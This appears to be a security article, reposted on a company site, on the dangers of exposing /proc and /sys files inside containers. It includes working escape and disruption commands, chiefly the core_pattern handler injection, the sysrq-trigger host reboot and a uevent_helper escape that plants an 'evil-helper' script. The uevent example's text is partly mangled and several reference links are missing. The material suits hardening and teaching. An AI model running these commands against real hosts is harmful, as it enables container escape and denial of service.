Websec | Uw Cybersecurity  SpecialistThe exposure of `/proc` and `/sys` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.

You can find further details of each potential vuln in .

## procfs Vulnerabilities

### `/proc/sys`

This directory permits access to modify kernel variables, usually via `sysctl(2)`, and contains several subdirectories of concern:

#### `/proc/sys/kernel/core_pattern`

Described in .

Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.

Testing and Exploitation Example:

```
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```

#### `/proc/sys/kernel/modprobe`

Detailed in .

Contains the path to the kernel module loader, invoked for loading kernel modules.

Checking Access Example:

```
ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
```

#### `/proc/sys/vm/panic_on_oom`

Referenced in .

A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.

#### `/proc/sys/fs`

As per , contains options and information about the file system.

Write access can enable various denial-of-service attacks against the host.

#### `/proc/sys/fs/binfmt_misc`

Allows registering interpreters for non-native binary formats based on their magic number.

Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.

Relevant exploit and explanation:

In-depth tutorial: 

### Others in `/proc`

#### `/proc/config.gz`

May reveal the kernel configuration if `CONFIG_IKCONFIG_PROC` is enabled.

Useful for attackers to identify vulnerabilities in the running kernel.

#### `/proc/sysrq-trigger`

Allows invoking Sysrq commands, potentially causing immediate system reboots or other critical actions.

Rebooting Host Example:

```
echo b > /proc/sysrq-trigger # Reboots the host
```

#### `/proc/kmsg`

Exposes kernel ring buffer messages.

Can aid in kernel exploits, address leaks, and provide sensitive system information.

#### `/proc/kallsyms`

Lists kernel exported symbols and their addresses.

Essential for kernel exploit development, especially for overcoming KASLR.

Address information is restricted with `kptr_restrict` set to `1` or `2`.

Details in .

#### `/proc/[pid]/mem`

Interfaces with the kernel memory device `/dev/mem`.

Historically vulnerable to privilege escalation attacks.

More on .

#### `/proc/kcore`

Represents the system's physical memory in ELF core format.

Reading can leak host system and other containers' memory contents.

Large file size can lead to reading issues or software crashes.

Detailed usage in .

#### `/proc/kmem`

Alternate interface for `/dev/kmem`, representing kernel virtual memory.

Allows reading and writing, hence direct modification of kernel memory.

#### `/proc/mem`

Alternate interface for `/dev/mem`, representing physical memory.

Allows reading and writing, modification of all memory requires resolving virtual to physical addresses.

#### `/proc/sched_debug`

Returns process scheduling information, bypassing PID namespace protections.

Exposes process names, IDs, and cgroup identifiers.

#### `/proc/[pid]/mountinfo`

Provides information about mount points in the process's mount namespace.

Exposes the location of the container `rootfs` or image.

### `/sys` Vulnerabilities

#### `/sys/kernel/uevent_helper`

Used for handling kernel device `uevents`.

Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.

Example for Exploitation: %%%bash

Creates a payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

Finds host path from OverlayFS mount for container

host_path=$(sed -n 's/.\perdir=([^,]).*/\1/p' /etc/mtab)

Sets uevent_helper to malicious helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

Triggers a uevent

echo change > /sys/class/mem/null/uevent

Reads the output

cat /output %%%

#### `/sys/class/thermal`

Controls temperature settings, potentially causing DoS attacks or physical damage.

#### `/sys/kernel/vmcoreinfo`

Leaks kernel addresses, potentially compromising KASLR.

#### `/sys/kernel/security`

Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.

Access might enable a container to disable its MAC system.

#### `/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`

Exposes interfaces for interacting with EFI variables in NVRAM.

Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.

#### `/sys/kernel/debug`

`debugfs` offers a "no rules" debugging interface to the kernel.

History of security issues due to its unrestricted nature.

Websec | Uw Cybersecurity  Specialist